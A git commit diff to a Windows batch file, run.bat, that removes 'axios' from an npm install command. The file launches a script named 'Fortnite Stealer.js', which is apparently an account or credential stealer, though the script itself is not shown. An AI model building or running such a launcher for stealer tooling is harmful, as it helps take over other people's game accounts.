ef08e216e2a66e6a2aba56472996324518321f70
XoidFN <162973879+Xoid-FNCS@users.noreply.github.com>
2024-12-04 14:14:19 -0800

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,3 +1,3 @@
 @echo off
-start cmd /k "npm install axios chalk && echo Packages installed successfully."
+start cmd /k "npm install chalk && echo Packages installed successfully."
 start cmd /k "node "Fortnite Stealer.js"
